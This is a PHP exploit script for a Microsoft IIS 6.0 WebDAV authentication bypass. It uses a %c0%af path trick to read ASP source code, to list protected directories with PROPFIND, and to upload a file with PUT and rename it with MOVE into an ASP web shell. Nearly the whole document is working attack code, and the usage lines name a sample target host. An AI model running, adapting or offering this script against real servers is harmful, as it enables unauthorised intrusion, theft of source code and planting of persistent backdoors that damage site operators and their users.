Microsoft IIS 6.0 WebDAV Remote Authentication Bypass Exploit (php)
===================================================================



<?

print_r(&#039;
********  IIS 6 WEBDAV Exploit && Securiteweb.org  ********
                                                         
       Usage: php &#039;.$argv[0].&#039; source/path/put host path    
       Example: php &#039;.$argv[0].&#039; source www.tian6.com /blog/readme.asp        
       Example2: php &#039;.$argv[0].&#039; path www.tian6.com /secret/
       Example3: php &#039;.$argv[0].&#039; put www.tian6.com /secret/ test.txt(evil code as test.txt)
****************************************************************
&#039;);

//verification du debut
if($argv[1]!="source"&&$argv[1]!="path"&&$argv[1]!="put"){echo "Choose a action,source or path or put.";die;}
else {$action=$argv[1];}

if(stristr($argv[2],"http://")){echo "No http:// in the host!";die;}
else{$host=$argv[2];}

if(stristr($argv[3],"/")==false){echo "Where is the / ?";die;}
else{$path=$argv[3];}


//sent
function sent($sock)   
{   
global  $host, $html;   
$ock=fsockopen(gethostbyname($host),&#039;80&#039;);   
if (!$ock) {   
echo &#039;No response from &#039;.$host; die;   
}   
fputs($ock,$sock);   
$html=&#039;&#039;;   
while (!feof($ock)) {   
$html.=fgets($ock);   
}   
fclose($ock);   
}   

if($action=="source"){
	$position=strrpos($path,"/");
    $path=substr_replace($path,"%c0%af/",$position,1);
	$sock="GET ".$path." HTTP/1.1\r\n";
    $sock.="Translate: f\r\n";
	$sock.="Host: ".$host."\r\n";
    $sock.="Connection:close\r\n\r\n";
	sent($sock);
	echo $html;
	die;
	}


if($action=="path"){
	$position=strrpos($path,"/");
    $path=substr_replace($path,"%c0%af",$position,0);
	$sock="PROPFIND  ".$path." HTTP/1.1\r\n";
	$sock.="Host: ".$host."\r\n";
    $sock.="Connection:close\r\n";
	$sock.=&#039;Content-Type: text/xml; charset="utf-8"&#039;."\r\n";
	$sock.="Content-Length: 0\r\n\r\n";
    $sock.=&#039;<?xml version="1.0" encoding="utf-8"?><D:propfind xmlns:D="DAV:"><D:prop xmlns:R="http://www.foo.bar/boxschema/"><R:bigbox/><R:author/><R:DingALing/><R:Random/></D:prop></D:propfind>&#039;;
    sent($sock);
	$bur=explode("<a:href>",$html);
    foreach($bur as $line){$no=strpos($line,"<");$resultat.=substr($line,0,$no)."\n";}
    echo $resultat;
	die;
    }


if($action=="put"){
	echo "Remember,keep urfile in type txt!\r\n\r\n";
     $fp = fopen("test.txt", &#039;r&#039;);
	 if($fp!=false){
     while (false!==($char = fgets($fp))) {
     $fir1=$char;
     }
     fclose($fp);
	$position=strrpos($path,"/");
    $path=substr_replace($path,"%c0%af",$position,0);
    $sock="PUT ".$path."test.txt HTTP/1.1\r\n";
	$sock.="Host: ".$host."\r\n";
	$sock.=&#039;Content-Type: text/xml; charset="utf-8"&#039;."\r\n";
	$sock.="Connection:close\r\n";
	$sock.="Content-Length: ".strlen($fir1)."\r\n\r\n";
    $sock.="".$fir1."\r\n";
   	echo $sock; sent($sock);sleep(2);
	$sock="MOVE ".$path."test.txt HTTP/1.1\r\n";
    $sock.="Host: ".$host."\r\n";
    $sock.="Connection:close\r\n";
	$sock.="Destination: ".$path."racle.asp\n\n";
    sent($sock);
	echo "Be cool,man! Webshell is http://".$host.$path."racle.asp";
	die;}
	else{die;}
	}




